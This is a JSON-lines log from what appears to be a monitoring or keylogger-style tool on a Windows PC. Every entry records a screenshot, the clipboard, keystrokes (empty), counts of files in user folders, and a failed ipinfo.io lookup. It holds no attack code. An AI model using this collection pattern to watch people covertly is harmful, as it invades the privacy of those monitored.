{"timestamp": "2025-06-14T08:52:33.703703+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4919d6fb92d945637e4d57ad5f21eb93e43fda0921d7b1cb1a21531b2ae3b867", "_raw_log_hash": "ab7eae8192b6148d614f16ffdbca81acaed8e42cf29213ae1150f7b9a4f4db08"}
{"timestamp": "2025-06-14T08:52:47.303590+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3f8588c1b39fe5da4d184bcebbf7a01205a17f262a2886e11aa0d328dd99b90a", "_raw_log_hash": "2f33b0525f8cee35ab66e6a3f44135e82ea650b760f0bf94c03320033c8f856e"}
{"timestamp": "2025-06-14T08:53:00.860014+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3499643498c5e7c7317089adc2ce3e137a52bb666523b5f65a10241dadc11843", "_raw_log_hash": "bc44022ea759d0dde83cf46192b222278be97c784ff362160bde025c3ba80e49"}
{"timestamp": "2025-06-14T08:53:14.357306+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "abd6f4227bbddadbe4a76d046b0970a0391b4876f7e758bd10824b120984542a", "_raw_log_hash": "6538dd034d6b61ef1aeb5811893a1371b62b70967ffd2180485e22dc3103dbd8"}
{"timestamp": "2025-06-14T08:53:27.927629+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0f9a0774fe71b5aa8ae02ccc27803b8e5a9bba2cfeee697677ed8138a96c60d2", "_raw_log_hash": "4d9fce285590e1c25e754a3c4d4382d1b2688157f81ff5b430534d70fb25f836"}
{"timestamp": "2025-06-14T08:53:41.521251+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b69159d8ec8a34e5687f894e49f130de64b8b2ee2cc45005de1fa2a1e404d20c", "_raw_log_hash": "36c9a4b51ade4e319cb60446fabedfbdd28cc77b42c5a03134f850d10d495c63"}
{"timestamp": "2025-06-14T08:53:55.104130+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4e151adfe67512a3b8a27e1d538185fe6003dc723b65efe69f3dd9cfdcde6e68", "_raw_log_hash": "cd8ae7899e41c32ff531e7f37eb24e05d7b3f50d7ad2e98bc17b3811c0688ca1"}
{"timestamp": "2025-06-14T08:54:08.671699+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a8eeec8342e68225506542a9b79d15f4f91fb6d458829ab31ea3a13eb1e83476", "_raw_log_hash": "5c5057c2c147b532dad1d749ebf4a757d8624fb156bb0994c61ec9eb7eb1b48e"}
{"timestamp": "2025-06-14T08:54:22.292608+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "655e929f1202f737606dbe58e70c416b3c42495f9e0cffbacfa21dbbbf47852d", "_raw_log_hash": "ab40ee7784f52af7bb7288c47c129b43c6dd59399900ac40797426aa1b25f3c8"}
{"timestamp": "2025-06-14T08:54:36.027753+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5f78a0219849a846058e749253ee9bc25e7d7e4f1ef57ee9f71ed830a74375c3", "_raw_log_hash": "f21098b1669d04caafaed46d73f318a248da2a342a6eb07f4bdb95e9e8f90c87"}
{"timestamp": "2025-06-14T08:54:49.622896+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f10edbeee0f3a1553ead8019f06ad5ae72613b20af6d77a3df0fc94f6e278bdf", "_raw_log_hash": "268aa66dc786fb24abcacd57aef8e437ae99b80aa01ff01e3d07a639af1d5ed7"}
{"timestamp": "2025-06-14T08:55:03.330576+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "457f27c305bbc9e6fd45c984ea1c8e20ab51b4bdd06fa8a1b9eb4cde026c8c37", "_raw_log_hash": "d977b31c0ea4f74018d9e59542b68edef6ebade43c113425b4d8cb110f9d8384"}
{"timestamp": "2025-06-14T08:55:16.873885+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c3e6544e282d473f4ad3bf835c5ea9ddafbdc9947ae51def000ad1f077dee5b8", "_raw_log_hash": "11bbfc7df527640e710cd9dc5ceaca78281f6271dddc20d3d97f71ca3aa4f019"}
{"timestamp": "2025-06-14T08:55:30.419042+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2f888fa57c934d074adbe2b985a15c1fc1e0a575f66abc1ee69aaf3ec9f78853", "_raw_log_hash": "3a552a9a4890730628d98d315fa57ad569600f168749861eb4a4b19fdf8b61e7"}
{"timestamp": "2025-06-14T08:55:44.045219+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b4b5644eb4d1e2a58786935f3b64dac6ada017e4ac20ab17f964f915277f0380", "_raw_log_hash": "97a3c573897f32b8d452b361f1d77571e8e68d4d9d79620c5a83a3a92cfd3842"}
{"timestamp": "2025-06-14T08:55:57.691663+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "daf31a981d63f1e41ca3de8cff2e61acbc28cf0d98bb9cf4c50120a1c0bccc34", "_raw_log_hash": "ce4a2f3de64260456617ee6a85da5c8cc96b414c1bb9f8a48e8c76108f05b138"}
{"timestamp": "2025-06-14T08:56:11.243394+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "79d3b3740570a46ec32dfa314e0645c87ec9dbfbf75224f1d013410718406a40", "_raw_log_hash": "cd6ac88842d10a83e5c69eed141835d32a2d829db52b4b6a910b652532835166"}
{"timestamp": "2025-06-14T08:56:24.888050+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5428a7d639218b095fa9ea1f66ab2694e415127d699be8885462841a166b832b", "_raw_log_hash": "cbda1d3803975f406de6b9ccadd5d0e596684d08aefdce539e1326fe0f937852"}
{"timestamp": "2025-06-14T08:56:38.576255+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec138034f8598123550fe8a64db86d6046f188cdc10c5a56fa8b2c1836beaa6d", "_raw_log_hash": "9dc8afe9c06e4ddf85dd7805f3cd2536e8c73439fd7e9810b6a8a07026e4b06d"}
{"timestamp": "2025-06-14T08:56:52.117404+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fb09cdd623b46e6c4e130b1d3b5460ceb0238791db869d22468738d8cf0862fb", "_raw_log_hash": "2dff20a1c9d738c4923be1973d5488d788521edac641d30f222b013f75d9e28c"}
{"timestamp": "2025-06-14T08:57:05.762678+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b9c2c2ef84f8bf4f4bd391f3a0de4bdf7ce2c49614257136b4fd3a0d5b431ae2", "_raw_log_hash": "c4c577d6ad3fd3b76d1c706e62ecc6a40ef173c725ce25d7fe8523706012dea0"}
{"timestamp": "2025-06-14T08:57:19.336173+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9c95ad095b32bc1cbd5f2ac155a37576d3efb9e041bea1d7381c2adce06658e4", "_raw_log_hash": "0bade632fd750931b551ee25cd2d4892fcac4dfb756a9f5ab533caa5e89ab8ce"}
{"timestamp": "2025-06-14T08:57:33.222981+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f71459f87808ff85d6dc197d30ecbeed2ff95be6b31ae171a1feae705c547d95", "_raw_log_hash": "58c9bb53bbcb36b6cb741799cf39265ab852bce76dff0d1b40591b7feaf05284"}
{"timestamp": "2025-06-14T08:57:46.773034+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b58eae2b453ed1a8a7186ff243e1b28a7a8d93bf61f9e8e61f3a4f527a982863", "_raw_log_hash": "33544f3fa49b0532273192372bc7070d6de1e2e4b3e30fdd4625274d4e686eda"}
{"timestamp": "2025-06-14T08:58:00.392522+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8e1d59edf3a1c265f0012329cbb28f620406dc6a71b3cac5187be21656cf3e1b", "_raw_log_hash": "26084254119c82d143430c73067c97afaadbe6e979344e1029781338512faea3"}
{"timestamp": "2025-06-14T08:58:14.015325+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec932ab20019e42a5d0d23966045f922922d39b0cad3a3d9efb1f506a1f6c9ec", "_raw_log_hash": "bebca3828c87548e77d96a59ce6bc8cc5167acf3e95a868b6b5992bc5e18c960"}
